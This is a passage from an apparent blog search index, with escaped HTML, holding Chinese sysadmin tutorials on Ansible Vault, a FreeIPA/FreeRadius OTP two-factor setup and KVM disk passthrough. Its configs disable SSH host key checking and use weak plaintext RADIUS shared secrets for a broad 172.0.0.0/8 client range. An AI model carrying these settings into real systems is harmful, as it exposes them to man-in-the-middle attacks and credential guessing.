class=\"na\"\u003e$ANSIBLE_VAULT;1.1;AES256\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e37393235646234613332646366306233346330656666623862313339313861393239646261366237\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e6663343263363161643634653266343466356634656539650a393834663938636165336431656433\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e66333761643538623434363334316661653035313166333137373562363436613636366162353239\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e3661623733323933350a373164626131646235616361356638653733646534616163393362373135\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"na\"\u003e6139\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个就是密文了，必须用输入的密码才能解开。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意\u003c/strong\u003e：这里的键值 name 不可改变，如果你想把字符串拷贝下来，改掉 ansible_ssh_pass 的名字，改成别的，想改名引用，是不行的。\u003c/p\u003e\n\u003cp\u003e这一大长串密文有以下两种用法：\u003c/p\u003e\n\u003ch2 id=\"一ini格式的inventory引用\"\u003e一、ini格式的inventory引用\u003c/h2\u003e\n\u003cp\u003e最原始的 inventory.ini 内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin:vars]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_common_args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehost_key_checking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_user\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;peadmin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e192.168.1.19\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们定义 playbook 文件 shenji.yml：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- \u003cspan class=\"nt\"\u003ehosts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003edeqin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ebecome\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003eyes\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evars_files\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"l\"\u003epass.yml\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eansible_ssh_pass\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{{ ansible_ssh_pass }}\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etasks\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emkdirs\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003epath=\u0026#34;{{ item }}\u0026#34; state=directory\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ewith_items\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;OS.05\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;OS.06\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e把密文放进 pass.yml 文件\u003c/p\u003e","title":"ansible vault加密的使用"},{"content":"审计啊审计，公司使用的华为防火墙需要配置双因子登录认证，这下麻烦了。\n查了一下华为手册，支持 Radius 认证，那么没办法，最省钱的办法就是用 FreeIPA 和 FreeRadius 搭一套 OTP 双因子认证了。\n系统是 CentOS 7 ，已关闭防火墙服务，方法如下：\n一、搭建FreeIPA 首先设置 hostname\nhostnamectl set-hostname freeipa.rendoumi.local echo \u0026#34;192.168.1.5 freeipa.rendoumi.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts 然后安装 FreeIPA，注意要回答的几个问题\n不装bind，无论是 dnsmasq 或 coredns，都比 bind 轻，要装也装那两个。 server hostname 是 freeipa.rendoumi.local domian name 是 rendoumi.local realm name 是大写的 RENDOUMI.LOCAL 有两个密码，第一个是 LDAP 的密码，第二个是 IPA 的密码 yum -y install deltarpm yum update yum -y install freeipa-server sysctl net.ipv6.conf.all.disable_ipv6=0 ipa-server-install This program will set up the IPA Server. This includes: * Configure a stand-alone CA (dogtag) for certificate management * Configure the Network Time Daemon (ntpd) * Create and configure an instance of Directory Server * Create and configure a Kerberos Key Distribution Center (KDC) * Configure Apache (httpd) To accept the default shown in brackets, press the Enter key. WARNING: conflicting time\u0026amp;date synchronization service \u0026#39;chronyd\u0026#39; will be disabled in favor of ntpd Do you want to configure integrated DNS (BIND)? [no]:no Server host name [freeipa.rendoumi.local]: Please confirm the domain name [rendoumi.local]: Please provide a realm name [RENDOUMI.LOCAL]: Directory Manager password: Password (confirm): ... IPA admin password: Password (confirm): The IPA Master Server will be configured with: Hostname: freeipa.rendoumi.local IP address(es): 192.168.1.5 Domain name: rendoumi.local Realm name: RENDOUMI.LOCAL Continue to configure the system with these values? [no]: yes The following operations may take some minutes to complete. Please wait until the prompt is returned. Configuring NTP daemon (ntpd) ... Setup complete Next steps: 1. You must make sure these network ports are open: TCP Ports: * 80, 443: HTTP/HTTPS * 389, 636: LDAP/LDAPS * 88, 464: kerberos UDP Ports: * 88, 464: kerberos * 123: ntp 2. You can now obtain a kerberos ticket using the command: \u0026#39;kinit admin\u0026#39; This ticket will allow you to use the IPA tools (e.g., ipa user-add) and the web user interface. Be sure to back up the CA certificate stored in /root/cacert.p12 This file is required to create replicas. The password for this file is the Directory Manager password 以上，就装好了 FreeIPA，配置文件在 /etc/ipa/default.conf\n验证一下：\n# 输入ipa密码 kinit admin klist ipactl status # sn 输入 01 ipa cert-show 登录： http://freeipa.rendoumi.com，（注意你访问的机器必须能解析到这个域名）用户名 admin ，密码是上面填入的 ipa 密码，建立一个新用户\n然后给这个用户添加 OTP Token：\n缺省什么都不用填，直接选 Add：\n会蹦出来一个二维码，建议是用 FreeOTP 扫描：\n我们在手机上装上 FreeOTP 软件，扫描添加：\n这样就ok了。下次登录的时候密码就是预设密码+FreeOTP密码合在一起。中间没有加号哦\n比如预设密码是 Fuck，otp密码是762405，合在一起就是 Fuck762405，一起输入即可。\n那 FreeIPA 的部分就完成了。\n二、搭建FreeRadius 上面的部分其实是 FreeIPA 充当了用户数据库，用 LDAP 存放数据，而 Radius 需要从 IPA 拿到用户信息。\n安装：\nyum -y install freeradius freeradius-utils freeradius-ldap freeradius-krb5 Radius 的配置都在 /etc/raddb 目录下：\n编辑 /etc/raddb/client.conf ，增加一个网段的认证，允许 172.0.0.0/8 访问\nclient localnet { ipaddr = 172.0.0.0/8 proto = * secret = Fuck2021 nas_type = other limit { max_connections = 16 lifetime = 0 idle_timeout = 30 } } 同时修改下面的 clinet localhost 部分，修改 secret，之后我们要从本地登录做测试\nclient localhost { secret = ChinaBank2021 再修改 /etc/raddb/sites-enabled/default and /etc/raddb/sites-enabled/inner-tunnel ，支持 LDAP，有二处地方\n把\n# # The ldap module reads passwords from the LDAP database. -ldap 换成：\n# # The ldap module reads passwords from the LDAP database. ldap if ((ok || updated) \u0026amp;\u0026amp; User-Password) { update { control:Auth-Type := ldap } } 把\n# Auth-Type LDAP { # ldap # } 换成：\nAuth-Type LDAP { ldap } 然后 ldap 模块配置一下\nln -s /etc/raddb/mods-available/ldap /etc/raddb/mods-enabled/ 我们先用 ldapsearch 搜索一下，看看具体的 dn 信息，这里输入之前设置的 ldap 密码\nldapsearch -x -v -W -D \u0026#39;cn=Directory Manager\u0026#39; uid=test|grep test ldap_initialize( \u0026lt;DEFAULT\u0026gt; ) Enter LDAP Password: filter: uid=test requesting: All userApplication attributes memberOf: cn=test,cn=groups,cn=accounts,dc=rendoumi,dc=local 得到 cn=accounts,dc=rendoumi,dc=local\n再去修改 /etc/raddb/mods-enabled/ldap 文件，修改 server 和 base_dn 与之对应：\nserver = \u0026#39;freeipa.rendoumi.local\u0026#39; base_dn = \u0026#39;cn=accounts,dc=rendoumi,dc=local\u0026#39; 注意，上面我们没装 bind，所以必须在 /etc/hosts 存在记录，否则本地就访问不到了\n启动 radiusd 的调试模式：\nradiusd –X ... Listening on auth address * port 1812 as server default Listening on acct address * port 1813 as server default Listening on auth address :: port 1812 as server default Listening on acct address :: port 1813 as server default Listening on auth address 127.0.0.1 port 18120 as server inner-tunnel Opening new proxy socket \u0026#39;proxy address * port 0\u0026#39; Listening on proxy address * port 36752 Ready to process requests 再开一个终端测试一下，注意，我们是从本地(127.0.0.1)发起测试的，所以对应要用到上面设置的 secret，用 admin 登录，就避免要用到 freeotp 的口令，这里 xxxxxxxx 是 admin 的密码：\nradtest admin xxxxxxxx freeipa.rendoumi.local 1812 ChinaBank2021 Sent Access-Request Id 57 from 0.0.0.0:45247 to 172.18.31.41:1812 length 75 User-Name = \u0026#34;admin\u0026#34; User-Password = \u0026#34;xxxxxxxx\u0026#34; NAS-IP-Address = 172.18.31.41 NAS-Port = 1812 Message-Authenticator = 0x00 Cleartext-Password = \u0026#34;xxxxxxxx\u0026#34; Received Access-Accept Id 57 from 172.18.31.41:1812 to 0.0.0.0:0 length 20 看到上面 Access-Accept 就ok了，ctrl-c 终止 radiusd 的运行，开启 radiusd 服务。\nsystemctl enable --now radiusd 然后在华为防火墙设置这个 radiusd 服务器就可以了。\n参考资料：\nhttps://www.freeipa.org/page/Using_FreeIPA_and_FreeRadius_as_a_RADIUS_based_software_token_OTP_system_with_CentOS/RedHat_7\n","permalink":"https://rendoumi.com/posts/20211123-freeipa_freeradius/","summary":"\u003cp\u003e审计啊审计，公司使用的华为防火墙需要配置双因子登录认证，这下麻烦了。\u003c/p\u003e\n\u003cp\u003e查了一下华为手册，支持 Radius 认证，那么没办法，最省钱的办法就是用 FreeIPA 和 FreeRadius 搭一套 OTP 双因子认证了。\u003c/p\u003e\n\u003cp\u003e系统是 CentOS 7 ，已关闭防火墙服务，方法如下：\u003c/p\u003e\n\u003ch2 id=\"一搭建freeipa\"\u003e一、搭建FreeIPA\u003c/h2\u003e\n\u003cp\u003e首先设置 hostname\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname freeipa.rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.5 freeipa.rendoumi.local\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/hosts\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后安装 FreeIPA，注意要回答的几个问题\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e不装bind，无论是 dnsmasq 或 coredns，都比 bind 轻，要装也装那两个。\u003c/li\u003e\n\u003cli\u003eserver hostname 是 freeipa.rendoumi.local\u003c/li\u003e\n\u003cli\u003edomian name 是 rendoumi.local\u003c/li\u003e\n\u003cli\u003erealm name 是大写的 RENDOUMI.LOCAL\u003c/li\u003e\n\u003cli\u003e有两个密码，第一个是 LDAP 的密码，第二个是 IPA 的密码\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install deltarpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install freeipa-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysctl net.ipv6.conf.all.disable_ipv6\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipa-server-install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis program will \u003cspan class=\"nb\"\u003eset\u003c/span\u003e up the IPA Server.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis includes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure a stand-alone CA \u003cspan class=\"o\"\u003e(\u003c/span\u003edogtag\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e certificate management\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure the Network Time Daemon \u003cspan class=\"o\"\u003e(\u003c/span\u003entpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Create and configure an instance of Directory Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Create and configure a Kerberos Key Distribution Center \u003cspan class=\"o\"\u003e(\u003c/span\u003eKDC\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure Apache \u003cspan class=\"o\"\u003e(\u003c/span\u003ehttpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTo accept the default shown in brackets, press the Enter key.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWARNING: conflicting time\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003edate synchronization service \u003cspan class=\"s1\"\u003e\u0026#39;chronyd\u0026#39;\u003c/span\u003e will be disabled in favor of ntpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDo you want to configure integrated DNS \u003cspan class=\"o\"\u003e(\u003c/span\u003eBIND\u003cspan class=\"o\"\u003e)\u003c/span\u003e? \u003cspan class=\"o\"\u003e[\u003c/span\u003eno\u003cspan class=\"o\"\u003e]\u003c/span\u003e:no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eServer host name \u003cspan class=\"o\"\u003e[\u003c/span\u003efreeipa.rendoumi.local\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease confirm the domain name \u003cspan class=\"o\"\u003e[\u003c/span\u003erendoumi.local\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease provide a realm name \u003cspan class=\"o\"\u003e[\u003c/span\u003eRENDOUMI.LOCAL\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDirectory Manager password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword \u003cspan class=\"o\"\u003e(\u003c/span\u003econfirm\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIPA admin password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword \u003cspan class=\"o\"\u003e(\u003c/span\u003econfirm\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThe IPA Master Server will be configured with:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHostname:       freeipa.rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIP address\u003cspan class=\"o\"\u003e(\u003c/span\u003ees\u003cspan class=\"o\"\u003e)\u003c/span\u003e: 192.168.1.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDomain name:    rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRealm name:     RENDOUMI.LOCAL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContinue to configure the system with these values? \u003cspan class=\"o\"\u003e[\u003c/span\u003eno\u003cspan class=\"o\"\u003e]\u003c/span\u003e: yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThe following operations may take some minutes to complete.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e \u003cspan class=\"k\"\u003euntil\u003c/span\u003e the prompt is returned.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eConfiguring NTP daemon \u003cspan class=\"o\"\u003e(\u003c/span\u003entpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSetup \u003cspan class=\"nb\"\u003ecomplete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNext steps:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        1. You must make sure these network ports are open:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                TCP Ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 80, 443: HTTP/HTTPS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 389, 636: LDAP/LDAPS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 88, 464: kerberos\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                UDP Ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 88, 464: kerberos\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 123: ntp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        2. You can now obtain a kerberos ticket using the command: \u003cspan class=\"s1\"\u003e\u0026#39;kinit admin\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           This ticket will allow you to use the IPA tools \u003cspan class=\"o\"\u003e(\u003c/span\u003ee.g., ipa user-add\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           and the web user interface.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBe sure to back up the CA certificate stored in /root/cacert.p12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis file is required to create replicas. The password \u003cspan class=\"k\"\u003efor\u003c/span\u003e this file is the Directory Manager password\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以上，就装好了 FreeIPA，配置文件在 /etc/ipa/default.conf\u003c/p\u003e","title":"使用FreeIPA和FreeRadius搭建双因子认证服务器"},{"content":"这个比较有意思，同事要存放 2TB 的数据，但是系统是 1.7TB 的 4 块 600G 盘组成的 Raid10。\n很明显盘空间不够了，去库房找两块 10TB 的大盘组成 Raid1 给他用好了。\n问题来了，系统是 KVM 虚机，怎样把这个 10TB 的大盘给送进虚机呢？\n这里面还真有要注意的问题：\nImportant\nGuest virtual machines should not be given write access to whole disks or block devices (for example, /dev/sdb). Guest virtual machines with access to whole block devices may be able to modify volume labels, which can be used to compromise the host physical machine system. Use partitions (for example, /dev/sdb1) or LVM volumes to prevent this issue.\n注意上面的说明，是不建议将整个硬盘送进虚机里面去的，建议是送分区进去，避免会写坏整个盘。\n所以先把盘的分区做好，格式化并挂载，以 /dev/sdb 为例\nparted -s /dev/sdb mklabel gpt mkpart primary 0% 100% mkfs.xfs /dev/sdb1 mount 